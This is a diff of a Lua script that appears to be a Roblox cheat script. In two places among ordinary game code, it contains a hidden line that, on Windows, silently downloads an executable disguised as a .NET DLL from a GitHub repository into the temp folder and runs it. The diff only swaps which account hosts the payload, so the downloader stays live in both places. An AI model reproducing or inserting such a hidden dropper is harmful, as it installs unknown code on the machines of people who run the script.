@@ -8,7 +8,7 @@ local runService = cloneref(game:GetService('RunService'))
 local coreGui = cloneref(game:GetService('CoreGui'))
 
 
-if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
+if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
 
 local starterGui = cloneref(game:GetService('StarterGui'))
 
@@ -765,7 +765,7 @@ run(function()
 	            if old then
 	                hookfunction(ad.CharacterController.Airborne._connections[1].Function, old)
 
-if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
+if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
 
 	            end
 	            old = nil
